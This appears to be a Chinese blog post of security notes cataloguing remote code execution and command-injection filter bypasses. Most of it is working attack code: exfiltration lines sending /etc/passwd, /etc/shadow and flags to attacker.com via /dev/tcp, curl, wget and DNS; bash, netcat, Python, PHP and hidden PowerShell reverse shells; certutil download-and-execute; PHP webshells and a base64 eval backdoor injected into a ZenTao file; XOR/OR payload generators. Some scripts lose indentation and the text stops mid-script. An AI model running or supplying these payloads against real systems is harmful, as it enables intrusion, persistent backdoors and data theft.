---
title: "命令执行(RCE)绕过技术"
description: "RCE (Remote Code Execution)：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。"
publishDate: "2025-09-30T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/bde42280679003ea3a6aef70e8079536.png"
categories: ["Vulnerability Research"]
tags: ["rce", "绕过"]
---
参考https://blog.csdn.net/qq\_43431158/article/details/105422347，写到异或绕过



## 1.  基础概念



**RCE (Remote Code Execution)**：远程代码执行漏洞，攻击者可直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。



## 2. 常见执行函数



### 2.1 PHP代码执行函数

`eval()`、`assert()`、`preg_replace()`、`create_function()`、`array_map()`、`call_user_func()`、`call_user_func_array()`、`array_filter()`、`uasort()`等。



### 2.2 PHP命令执行函数

`system()`、`exec()`、`shell_exec()`、`pcntl_exec()`、`popen()`、`proc_popen()`、`passthru()`等。

`passthru('tac fla*');`

### 2.3 特殊函数利用

* **反引号执行**：`` `ls` `` 或 `<?= `ls` ?>`（短标签形式）

* **无参数函数调用**：PHP 7+支持`('phpinfo')();`形式的调用



## 3. 从系统提取数据

```markdown
# File reading
$(cat /etc/passwd > /dev/tcp/attacker.com/4444)
; base64 /etc/shadow | curl -d @- http://attacker.com

# System enumeration
; find / -perm -4000 2>/dev/null
; netstat -an | nc attacker.com 4444
```

* `netstat -an`：`netstat` 命令用于显示网络连接、路由表、接口统计等信息。

  * `-a`：显示所有活动的连接和监听端口。

  * `-n`：以数字形式显示地址和端口号，而不尝试进行 DNS 解析。

## 4. 反向 Shell

### 4.1 基本反向

```markdown
# Bash reverse shell
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

# Netcat reverse shell
nc -e /bin/sh 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 4.2 Linux反弹shell的方式实现后渗透的利用

```bash
// 反弹shell
$sock = fsockopen("192.168.96.1", 2333);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);


```

* `fsockopen()`: 这是一个PHP函数，用于建立一个网络套接字连接（Socket连接）。它可以用来连接任何TCP或UDP端口。

* `proc_open()`: 这个PHP函数用于执行一个命令，并创建一个进程，同时对这个进程的标准输入、输出、错误流进行控制。

* `"/bin/sh -i"`: 这是要执行的命令。

  * `/bin/sh`: 是Linux系统上的标准Shell解释器（Bourne shell）。有时也会使用`/bin/bash`。

  * `-i`: 参数代表“交互式模式”（interactive）。这使得Shell会提供一个提示符，并且对于反向Shell来说，这个参数通常至关重要，它能确保Shell的输入输出被正确重定向。

* `array(0=>$sock, 1=>$sock, 2=>$sock)`:

  * 这是一个数组，它将新进程的文件描述符重定向到我们之前建立的Socket连接（`$sock`）。

  * `0`: 代表标准输入（STDIN）。进程将从这里读取输入。

  * `1`: 代表标准输出（STDOUT）。进程的输出将写入这里。

  * `2`: 代表标准错误（STDERR）。进程的错误信息将写入这里。

  * 这里将所有三个流（输入、输出、错误）都指向了同一个Socket连接 `$sock`。

* `$pipes`: 这是一个将在调用后被填充的变量，它包含了指向子进程相应管道的数组，但在这个反弹Shell的上下文中，我们并不关心它，因为所有的流都已经重定向到网络Socket了。

```bash
// 写入webshell
$maliciousFile = '/opt/zbox/app/zentao/www/test.php';
$maliciousContent = '<?php phpinfo(); ?>';
file_put_contents($maliciousFile, $maliciousContent);
```





### 4.3 Windows 反弹shell实现后渗透利用

#### 4.3.1 Powershell命令执行

```bash
# PowerShell reverse shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


```

###### A. 执行参数（规避检测和限制）：

这些参数让PowerShell以非常隐蔽的方式运行：

* `-NoP` (`-NoProfile`)：不加载用户配置文件，加快启动速度，避免配置文件中的命令干扰。

* `-NonI` (`-NonInteractive`)：非交互式模式，适合自动化。

* `-W Hidden` (`-WindowStyle Hidden`)：隐藏窗口，受害者看不到任何弹出的PowerShell窗口。

* `-Exec Bypass` (`-ExecutionPolicy Bypass`)：绕过执行策略。执行策略是PowerShell的安全限制，默认可能阻止脚本运行。此参数绕过所有限制。

* `-Command ...`：执行后面跟随的命令字符串。

###### B. 反向Shell代码（核心逻辑）：

我们从逻辑块来分解这段复杂的代码：

1. 建立连接：

* $client = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)

  * 创建一个TCP客户端对象，并连接到攻击者的IP `10.0.0.1` 的 `4444` 端口。

- 获取网络流：

* $stream = $client.GetStream()

  * 获取用于发送和接收数据的网络流对象。

- 创建数据缓冲区：

* \[byte\[]]$bytes = 0..65535|%{0}

  * 创建一个长度为65536字节的数组，并全部初始化为0，用于存放从网络接收到的数据。

- 主循环 - 接收并执行命令：

* while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)

  * 这是一个无限循环，只要网络连接还在（读取到的字节数 `$i` 不为0），就持续运行。

  * `$stream.Read(...)` 从网络连接中读取数据到 `$bytes` 缓冲区。

- 解码命令：

* $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)

  * 将接收到的字节数据（`$bytes`）解码成ASCII字符串（`$data`）。这个字符串就是攻击者发送的命令。

- 执行命令（最关键的一步）：

* $sendback = (iex $data 2>&1 | Out-String )

  * `iex` 是 `Invoke-Expression` 的别名，它会执行接收到的字符串 `$data` 作为PowerShell命令。

  * `2>&1` 将标准错误流合并到标准输出流，确保错误信息也能被捕获。

  * `| Out-String` 将命令的执行结果转换为字符串。

- 构造提示符并发送回结果：

* $sendback2 = $sendback + "PS " + (pwd).Path + "> "$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2)$stream.Write($sendbyte,0,$sendbyte.Length)$stream.Flush()

  * 在结果后添加一个类似PowerShell的提示符（如 `PS C:\>`）。

  * 将结果字符串编码为字节，并通过网络流写回给攻击者。

- 关闭连接：

* $client.Close()

  * 当循环退出后（连接断开），关闭客户端。

最终效果： 受害主机会主动连接攻击者的机器（`10.0.0.1:4444`），并为攻击者提供一个功能完整的PowerShell命令行。

#### 4.3.2 certutil恶意文件下载执行

```bash

# Certutil download and execute
certutil -urlcache -split -f http://10.0.0.1/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe

```

1. `certutil`：

   * 一个合法的Windows命令行工具，主要用于管理数字证书。因为它是一个可信的、签名的系统程序，所以其网络活动往往不受防火墙或安全软件的严格审查。

2. 参数说明：

   * `-urlcache`：显示或删除URL缓存条目。但关键的是，它支持从URL检索文件。

   * `-split`：将ASN.1编码的文件拆分为多个部分（在这里用于正确保存二进制文件）。

   * `-f` (`-force`)：强制覆盖现有文件。

   * 这些参数组合在一起，被攻击者滥用来下载文件。

3. 下载文件：

* certutil -urlcache -split -f http://10.0.0.1/shell.exe C:\Windows\Temp\shell.exe

  * 从攻击者的服务器 `http://10.0.0.1/shell.exe` 下载一个文件。

  * 将其保存到受害者机器的 `C:\Windows\Temp\shell.exe` 路径下。选择此目录是因为任何用户通常都有写入权限。

- 执行文件：

* && C:\Windows\Temp\shell.exe

  * `&&` 是命令连接符，表示只有前一条命令成功执行后，才执行后面的命令。

  * 执行刚刚下载的恶意程序 `shell.exe`。这个程序可能是一个后门、勒索软件或任何其他Payload。

#### 4.3.3 windows写入木马

```bash
$filePath = 'C:\\Users\\t1sts\\Desktop\\ZenTao\\app\\zentao\\www\\x.php';

$lines = file($filePath);

$decodedCode = base64_decode("QGV2YWwoJF9QT1NUWydUMXN0cyddKTs=");
array_splice($lines, 1, 0, $decodedCode);

file_put_contents($filePath, implode('', $lines));
```





## 5. 关键字过滤绕过



### 5.1  命令替代

使用其他读取命令绕过`cat`、`flag`等关键词过滤：

* `more`: 一页一页显示文件内容

* `less`: 与more类似，可上下翻页

* `head`: 查看头几行

* `tac`: 从最后一行开始显示（cat的反向显示）

* `tail`: 查看尾几行

* `nl`: 显示内容并输出行号

* `od`: 以二进制方式读取文件内容

* `vi`/`vim`: 编辑器查看文件

* `sort`: 排序文件内容

* `uniq`: 报告或删除文件中重复行

* `file -f`: 报错出具体内容

* `strings`: 输出文件中可打印字符

* `grep`: 搜索文件中的字符串

* `rev`：$(rev<<<'imaohw')`<<<` 被称为 "here string"。它是一种将字符串（而不是文件）重定向到命令标准输入的方法。`rev` 是一个简单的实用程序，用于反转给定输入中的字符顺序。



### 5.2 符号干扰绕过

* **转义符号**：`ca\t /fl\ag`

* **单引号包裹**：`cat fl'a'g` 或 `cat fl''ag`（Linux下需要偶数个单引号）

  `"w"h"o"a"m"i`

* **双引号包裹**：`cat fl"a"g` 或 `cat fl""ag`（Windows下无限制，Linux需偶数个）

* **反斜杠**：`cat fl\ag.p\hp`（Linux下反斜杠作为转义符）

* **反引号**：``cat `echo fla`g`` 或 `cat $(echo fla)g`



### 5.3  变量拼接绕过

```bash
a=fl;b=ag;cat$IFS$a$b
c=a;d=t;$c$d /flag
```



### 5.4  空变量干扰绕过

使用`$*`、`$@`、`$x`、`${x}`（这些变量输出为空）：

```bash
cat /fl$*ag
cat /fl$@ag
cat /fl$9ag
cat /fl${1}ag
```



### 5.5  通配符绕过

* `?` 匹配单个字符：`cat /fla?`

  *`Wildcard usage`*
  `/???/??t /??c/p??s??`
  `/bin/c?t /etc/p?ssw?`

* `*` 匹配任意字符：`cat /fla*`

* 组合使用：`cat /???/pass*`（匹配/etc/passwd）





1. \[…]表示匹配方括号之中的任意一个字符

2. {…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。

3. {…}与\[…]有一个重要的区别，当匹配的文件不存在，\[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开

```bash

cat  t[a-z]st
cat  t{a,b,c,d,e,f}st

```

![](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/3f7efb6fa4cbec7a32f678a644e6eb4f.png)



### 5.6  环境变量截取绕过

```bash
# 利用PATH环境变量截取字符
echo ${PATH} # 输出：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wh${PATH:5:1}${PATH:8:1}ami # 拼接出"whoami"

export CMD="Y2F0IC9ldGMvcGFzc3dk";bash<<<$(base64 -d<<<$CMD)
<<< $CMD：这是一个 Here String，它将变量 $CMD 的值作为输入传递给后面的命令。
```

![img](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/4ea16c068cc0f5a6a24d410b9ef2887e.png)

在Bash中，${#var#} 的语法用于获取变量 var 的长度（即字符数）。

这种形式可以应用于任何变量，无论是字符串变量还是环境变量。

我们知道 ${HOME} 是 /root，因此 ${#HOME#} 就是 5。

内置变量：$RANDOM

它会生成一个[随机数](https://so.csdn.net/so/search?q=随机数&spm=1001.2101.3001.7020)，长度一般是 4 位或者 5 位，也就是说我们可以得到 4 或者 5 。

![img](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/137e4cb54abfdea3364361800f6fbed5.png)

### 5.7 Shell特殊变量

***reference：https://c.biancheng.net/***

https://www.freebuf.com/articles/web/321865.html

https://blog.csdn.net/weixin\_33725126/article/details/86024670#(这个文章写的例子也比较全面)

&#x20;https://systemweakness.com/bash-injection-without-alphabets-picoctf-2024-writeup-sansalpha-be70a37ce6eb#(这道题不让字母但是可以用数字)

#### Shell 中常用的六种数学计算方式

| 运算操作符/运算命令                                               | 说明                                                                                  |
| -------------------------------------------------------- | ----------------------------------------------------------------------------------- |
| [(( ))](https://c.biancheng.net/view/2480.html)          | 用于整数运算，效率很高，**推荐使用**。                                                               |
| [let](https://c.biancheng.net/view/2504.html)            | 用于整数运算，和 (()) 类似。                                                                   |
| [$\[\]](https://c.biancheng.net/view/vip_3235.html)      | 用于整数运算，不如 (()) 灵活。                                                                  |
| [expr](https://c.biancheng.net/view/vip_3236.html)       | 可用于整数运算，也可以处理字符串。比较麻烦，需要注意各种细节，不推荐使用。                                               |
| [bc](https://c.biancheng.net/view/vip_3237.html)         | Linux下的一个计算器程序，可以处理整数和小数。Shell 本身只支持整数运算，想计算小数就得使用 bc 这个外部的计算器。                     |
| $(( expression ))                                        | 会对表达式进行算术求值并返回结果                                                                    |
| [declare -i](https://c.biancheng.net/view/vip_3238.html) | 将变量定义为整数，然后再进行数学运算时就不会被当做字符串了。功能有限，仅支持最基本的数学运算（加减乘除和取余），不支持逻辑运算、自增自减等，所以在实际开发中很少使用。 |

$() 仅在 Bash Shell 中有效，而反引号可在多种 Shell 中使用。$() 在 Bash 中表示，所有在 $() 中的字符串都会被当作命令执行。

#### Shell位置参数（命令行参数）$n

1. 给脚本文件传递位置参数

&#x20;test.sh：

```bash
#!/bin/bash

echo "Language: $1"
echo "URL: $2"
```

运行 test.sh，并附带参数：

```plain text
[mozhiyan@localhost ~]$ cd demo
[mozhiyan@localhost demo]$ . ./test.sh Shell http://c.biancheng.net/shell/
Language: Shell
URL: http://c.biancheng.net/shell/
```

其中`Shell`是第一个位置参数，`http://c.biancheng.net/shell/`是第二个位置参数，两者之间以空格分隔。

* 给函数传递位置参数

test.sh：

```bash
#!/bin/bash

#定义函数
function func(){
    echo "Language: $1"
    echo "URL: $2"
}

#调用函数
func C++ http://c.biancheng.net/cplus/
```

运行 test.sh：

```plain text
[mozhiyan@localhost ~]$ cd demo
[mozhiyan@localhost demo]$ . ./test.sh
Language: C++
URL: http://c.biancheng.net/cplus/
```

关于函数定义和调用的具体语法请访问：[Shell函数定义和调用](https://c.biancheng.net/view/1009.html)、[Shell函数参数](https://c.biancheng.net/view/2860.html)

**注意事项**

如果参数个数太多，达到或者超过了 10 个，那么就得用`${n}`的形式来接收了，例如 ${10}、${23}。

#### Shell特殊变量：Shell $#、$\*、$@、$?、\$$

| 变量         | 含义                                                                                                                    |
| ---------- | --------------------------------------------------------------------------------------------------------------------- |
| $0         | 当前脚本的文件名。                                                                                                             |
| $n（n≥1）    | 传递给脚本或函数的参数。n 是一个数字，表示第几个参数。例如，第一个参数是 $1，第二个参数是 $2。                                                                   |
| $#         | 传递给脚本或函数的参数个数。                                                                                                        |
| $\*        | 传递给脚本或函数的所有参数。                                                                                                        |
| $@         | 传递给脚本或函数的所有参数。当被双引号`" "`包含时，$@ 与 $\* 稍有不同，我们将在《[Shell $\*和$@的区别](https://c.biancheng.net/view/vip_4559.html)》一节中详细讲解。 |
| $?         | 最后一次执行的命令的返回状态。如果这个变量的值为 0，就证明上一条命令正确执行；如果这个变量的值为非 0（具体是哪个数由编程人员决定），就证明上一条命令执行错误                                      |
| \$$        | 当前 Shell 进程 ID。对于 Shell 脚本，就是这些脚本所在的进程 ID。                                                                            |
| \_         |  表示上一个命令的最后一个参数或上一个执行的命令的最后一个参数                                                                                       |
| $\_        |  表示上一个命令的最后一个参数                                                                                                       |
| $!         | 后台运行的最后一个进程的进程 PID                                                                                                    |

1. 给脚本文件传递参数

编写下面的代码，并保存为 test.sh：

```bash
#!/bin/bash

echo "Process ID: $$"
echo "File Name: $0"
echo "First Parameter : $1"
echo "Second Parameter : $2"
echo "All parameters 1: $@"
echo "All parameters 2: $*"
echo "Total: $#"
```

运行 test.sh，并附带参数：

```yaml
[mozhiyan@localhost demo]$ . ./test.sh Shell Linux
Process ID: 5943
File Name: bash
First Parameter : Shell
Second Parameter : Linux
All parameters 1: Shell Linux
All parameters 2: Shell Linux
Total: 2
```

* 给函数传递参数

编写下面的代码，并保存为 test.sh：

```bash
#!/bin/bash

#定义函数
function func(){
    echo "Language: $1"
    echo "URL: $2"
    echo "First Parameter : $1"
    echo "Second Parameter : $2"
    echo "All parameters 1: $@"
    echo "All parameters 2: $*"
    echo "Total: $#"
}

#调用函数
func Java http://c.biancheng.net/java/
```

运行结果为：

```sql
Language: Java
URL: http://c.biancheng.net/java/
First Parameter : Java
Second Parameter : http://c.biancheng.net/java/
All parameters 1: Java http://c.biancheng.net/java/
All parameters 2: Java http://c.biancheng.net/java/
Total: 2
```

$?、\$$和$!的用法进一步深入https://c.biancheng.net/view/claof8i.html

#### Shell特殊命令$- 和 $\_

reference：https://zhuanlan.zhihu.com/p/57784678

```plain text
$- 是 set 命令的 –h 和 –B 的参数, 表示使用内置的 set 命令扩展解释之后的参数行, 
   具体分别表示为, 记住工作路径, 和允许使用 ! 历史扩展, 详细请参阅 set 命令.

$_ (下划线) 表示的是打印上一个输入参数行, 当这个命令在开头时, 打印输出文档的绝对路径名.
```

举例如下:

例如我们有一个文档, test\_3.sh

```plain text
#!/bin/bash
echo “Current absolute file path name is: $_”
echo “$-“
echo “Second $_”

let cnt=1
echo “Third $_”
echo “$cnt”
echo “Fourth $_”
```

执行命令:

```plain text
./test_3.sh
```

输出的结果是:

```plain text
Current absolute file path name is: ./test_3.sh
hB
Second hB
Third cnt=1
1
Fourth 1
```

*解释如下:*

由于我们是在当前路径下执行的文档, 那么在文档开始, 所有命令之前 $\_ 获得就是文档的绝对路径名称, ./test\_3.sh, 这里 . (点号) 表示当前路径.

执行 $- 后, 表示使用 set 的 –h 和 –B 选项, 这时传入的参数是 hB;

第二次执行 $\_ 后, 获得上次传入的参数, 表示为 hB;

在第三次执行时, 由于上次对于 let 命令传入的参数是 cnt=1, 那么这时获得的参数是 cnt=1;

第四次执行时, 对于 echo 传入的参数是扩展后的 $cnt, 也就是 1, 那么这时获得参数就是 1.



Bash 下`$>_=:!(){}`的极限构造(TFCCTF\_minijail)

```yaml
___=${_}                           
__=$((!_))
____=${!__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
___=${___:$__}
___=${___:$__}
${____:$((!__)):$__}${___:$((!__)):$__}
```

在Bash的算术上下文中（`$(( ))`内部），变量会被尝试转换为整数。转换规则是：

* 如果变量看起来像数字（如"123"），则转换为对应数字

* 如果变量是空字符串或未设置，则转换为0

* 如果变量是非数字字符串（如"echo"），则转换为0

```yaml
# 将环境变量_的值（假设为"echo"）赋给变量___
___=${_}

# 利用算术展开生成数字1：!_ 在算术上下文中（_非空视为0，!0=1）得到1，赋给变量__
__=$((!_))

# 间接引用：${!__} 即 ${1}，取第一个参数的值（假设为"yooooooo_mama_test"），赋给变量____
____=${!__}

# 以下17行对____进行切片，每次切除第一个字符（偏移量为1），最终____变为"st"（原始字符串切17次后剩余子串）
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}
____=${____:$__}

# 对___进行两次切片（初始值为"echo"），第一次切为"cho"，第二次切为"ho"
___=${___:$__}
___=${___:$__}

# 组合命令：${____:0:1} 取"st"的第0个字符（即"s"），${___:0:1} 取"ho"的第0个字符（即"h"），组合成"sh"并执行
${____:$((!__)):$__}${___:$((!__)):$__}
```



### 5.8 内联执行绕过



```bash
# 通过变量拼接
a=f;b=l;c=a;d=g;cat $a$b$c$d.php

# 通过命令替换
cat $(echo fla)g.php
cat `echo fla`g.php
```



## 6. 编码绕过技术



### 6.1 Base64编码

```bash
echo "Y2F0IC9mbGFn" | base64 -d | bash
echo "Y2F0IC9mbGFn" | base64 -d | sh
`echo "Y2F0IC9mbGFn" | base64 -d`
$(echo "Y2F0IC9mbGFn" | base64 -d)
```



### 6.2 Hex编码（ASCII编码）

```bash
echo 77686F616D69 | xxd -r -p | bash # whoami的hex
printf "\x77\x68\x6f\x61\x6d\x69" | bash # whoami的十六进制格式
```



### 6.3  八进制编码

```bash
echo "$(printf '\143\141\164\40\146\154\141\147')" # cat flag的八进制

```



### 6.4  Unicode编码

```bash
# 在支持Unicode的环境中可能有效
echo $'\u0063\u0061\u0074\u0020\u0066\u006c\u0061\u0067' # cat flag
```

```bash

# Unicode encoding
㎈㎉㎊㎋㎌㎍㎎  # Using Unicode lookalikes
```



### 6.5 十六进制

```bash
echo -n "whoami" | xxd -p   #（-n让echo不输出换行符）
bash <<< $(xxd -r -p <<< 776863616D69)
xxd -r -p：
xxd 是一个用于创建十六进制转储（hex dump）或进行反向操作的工具。
-r：反向操作（reverse），将十六进制转储转换回二进制数据。
-p：以纯十六进制转储模式处理输入，没有地址信息和列格式。
所以 xxd -r -p 会将纯十六进制字符串 776863616D69 转换回其对应的ASCII字符 whoami。

$(echo -e "\x77\x68\x6f\x61\x6d\x69") # whoami in hex
```



## 7. 空格过滤绕过



### 7.1  特殊变量替代

* `$IFS`：内部字段分隔符

* `${IFS}`：同上

* `$IFS$9`：$9为空变量，用于截断

* `%09`

```bash
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
```



### 7.2  重定向符号替代

* `<`：输入重定向

* `<>`：输入输出重定向

```bash
cat</etc/passwd
cat<>/etc/passwd
```



### 7.3 大括号替代

```bash
{cat,/etc/passwd}
```



### 7.4 URL编码替代

* `%09`：TAB键（URL编码）

* `%20`：空格（URL编码）

```bash
curl http://example.com?cmd=cat%09/etc/passwd
```



### 7.5 其他特殊形式

```bash
X=$'cat\x20/etc/passwd'&&$X
```



## 8.  分隔符过滤绕过



### 8.1 常用分隔符

* `;`：顺序执行多条命令（无论前面真假）

* `|`：管道符，只执行后面命令，前面输出作为后面输入

* `||`：前面执行失败才执行后面

* `&`：两条命令都会执行（无论前面真假）

* `&&`：前面成功才执行后面



### 8.2  换行符和回车符

* `%0a`：换行符（URL编码）

* `%0d`：回车符（URL编码）



### 8.3  PHP特定绕过

* `?>`：可以代替最后一个分号



## 9. 无回显处理技巧



### 9.1 时间盲注

通过延时判断命令是否执行成功：

```bash
ls && sleep 3 # 执行成功则休眠3秒
ls || sleep 3 # 执行失败则休眠3秒
```



### 9.2  HTTP外带数据

通过HTTP请求将数据外带：

```bash
# 使用curl
curl http://attacker.com/record.php?data=$(cat /flag | base64)

# 使用wget
wget http://attacker.com/record.php?data=$(cat /flag | base64)
```



### 9.3 DNS外带数据

通过DNS查询外带数据：

```bash
# 将数据作为子域名查询
cat /flag | xargs -I {} dig {}.attacker.com
```



### 9.4 写入文件后访问

```bash
# 复制文件
cp /flag /var/www/html/flag.txt
cat /flag > /var/www/html/flag.txt

# 压缩文件
tar zcvf /var/www/html/flag.tar.gz /flag

# 创建Webshell
echo '<?php @eval($_POST["cmd"]);?>' > /var/www/html/shell.php
```



## 10. 长度限制绕过



### 10.1 短命令生成

（1）、通过文件创建和ls排序构造命令：

```bash
# 创建短文件名
>ag
>fl\\
>t\\
>ca\\

# 按时间排序写入文件
ls -t > x

# 执行命令
sh x
```

（2）、创建文件名可以连成要执行命令的空文件

```plain text
[root@localhost test]# ls
flag.php
[root@localhost test]# >"php"
[root@localhost test]# >"ag.\\"
[root@localhost test]# >"fl\\"
[root@localhost test]# >"t \\"
[root@localhost test]# >"ca\\"
[root@localhost test]# 
用2个反斜杠的原因：用前1个反斜杠转义后1个反斜杠
```

执行`ls -t>getflag`将目录下的文件名按时间排序后写进getflag文件里

```plain text
[root@localhost test]# ls -t>getflag
[root@localhost test]# ls -t
getflag  ca\  t \  fl\  ag.\  php  flag.php
[root@localhost test]#
[root@localhost test]# cat getflag
getflag
ca\
t \
fl\
ag.\
php
flag.php
```

执行`sh getflag`命令，从getflag文件中读取命令来执行

```plain text
[root@localhost test]# sh getflag
getflag:行1: getflag: 未找到命令
12345 you get it
getflag:行7: flag.php: 未找到命令
```

### 10.2  环境变量扩展

通过环境变量存储数据：

```bash
# 将命令存储在环境变量中
export CMD="cat /flag"
$CMD
```



### 10.3  通过换行连接

使用反斜杠换行连接长命令：

```bash
c\
a\
t\
 /f\
l\
a\
g
```



## 11. 无参数RCE绕过

参考：https://www.freebuf.com/articles/system/242482.html

```bash
<?php
highlight_file(__FILE__);
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    eval($_GET['code']);
}
?>
```

### 11.1 目录遍历读取

```php
// 查看当前目录
print_r(scandir(current(localeconv())));
print_r(scandir('.'));

// 查看上级目录
print_r(scandir(dirname(getcwd())));

// 读取文件
show_source(end(scandir(dirname(getcwd()))));
readfile(end(scandir(dirname(getcwd()))));
```



### 11.2 Session ID利用

```php
// 通过hex2bin解码Session ID中的命令
eval(hex2bin(session_id(session_start())));

// 设置Cookie: PHPSESSID=706870696e666f28293b (phpinfo();的hex)
```



### 11.3  HTTP头利用

```php
// 获取HTTP头并执行
eval(pos(getallheaders()));

// 在最后一个HTTP头中放入: cmd: system('ls');
```



### 11.4  全局变量利用

```php
// 通过GET参数执行
eval(end(current(get_defined_vars())));
// URL: ?0=system('ls');&1=a
```



## 12. 无字母数字绕过

Reference：https://blog.csdn.net/miuzzx/article/details/109143413

https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/

https://www.freebuf.com/articles/network/279563.html

```shell
if(preg_match('/[a-z0-9]/i',$code)){
    die('hacker');
}
```

### 12.1  异或运算绕过

搬运自：https://www.freebuf.com/articles/network/279563.html

```bash
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);

```

看到代码中的下划线\_、\_\_、\_\_\_是一个变量，因为 preg\_match() 过滤了所有的字母，我们只能用下划线来作变量名。最后拼接起来 Payload 如下：

```bash
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);

// 密码为 "_"
```





```php
<?php
// 生成异或payload的脚本
$myfile = fopen("xor_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
    for ($j=0; $j <256 ; $j++) { 
        if($i<16){
            $hex_i='0'.dechex($i);
        }else{
            $hex_i=dechex($i);
        }
        if($j<16){
            $hex_j='0'.dechex($j);
        }else{
            $hex_j=dechex($j);
        }
        $preg = '/[a-z0-9]/i'; // 根据题目正则修改
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
            echo "";
        }else{
            $a='%'.$hex_i;
            $b='%'.$hex_j;
            $c=(urldecode($a)^urldecode($b));
            if (ord($c)>=32&ord($c)<=126) {
                $contents=$contents.$c." ".$a." ".$b."\n";
            }
        }
    }
}
fwrite($myfile,$contents);
fclose($myfile);
?>
```

&#x20;     首先运行以上 PHP 脚本后，会生成一个 txt 文档 xor\_rce.txt，里面包含所有可见字符的异或构造结果。

接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：

```python
# -*- coding: utf-8 -*-

def action(arg):
s1=""
s2=""
for i in arg:
f=open("xor_rce.txt","r")
while True:
t=f.readline()
if t=="":
break
if t[0]==i:
#print(i)
s1+=t[2:5]
s2+=t[6:9]
break
f.close()
output="(\""+s1+"\"^\""+s2+"\")"
return(output)

while True:
param=action(input("\n[+] your function：") )+action(input("[+] your command："))+";"
print(param)
```

### 12.2 或运算绕过

在前面异或绕过中我们说了，PHP 中两个字符串异或之后得到的还是一个字符串。那么或运算原理也是一样，如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行或运算，从而得到我们想要的字符串。

#### 构造脚本

下面给出一个或运算绕过的脚本：

```bash
<?php

$myfile = fopen("or_rce.txt", "w");
$contents="";
for ($i=0; $i < 256; $i++) { 
for ($j=0; $j <256 ; $j++) { 

if($i<16){
$hex_i='0'.dechex($i);
}
else{
$hex_i=dechex($i);
}
if($j<16){
$hex_j='0'.dechex($j);
}
else{
$hex_j=dechex($j);
}
$preg = '/[0-9a-z]/i';    // 根据题目给的正则表达式修改即可
if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
echo "";
}

else{
$a='%'.$hex_i;
$b='%'.$hex_j;
$c=(urldecode($a)|urldecode($b));
if (ord($c)>=32&ord($c)<=126) {
$contents=$contents.$c." ".$a." ".$b."\n";
}
}

}
}
fwrite($myfile,$contents);
fclose($myfile);
```

首先运行以上 PHP 脚本后，会生成一个 txt 文档or\_rce.txt，里面包含所有可见字符的或运算构造结果。

接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：

```python
-*- coding: utf-8 -*-

def action(arg):
s1=""
s2=""
for i in arg:
f=open("or_rce.txt","r")
while True:
t=f.readline()
if t=="":
break
if t[0]==i:
#print(i)
s1+=t[2:5]
s2+=t[6:9]
break
f.close()
output="(\""+s1+"\"|\""+s2+"\")"
return(output)

while True:
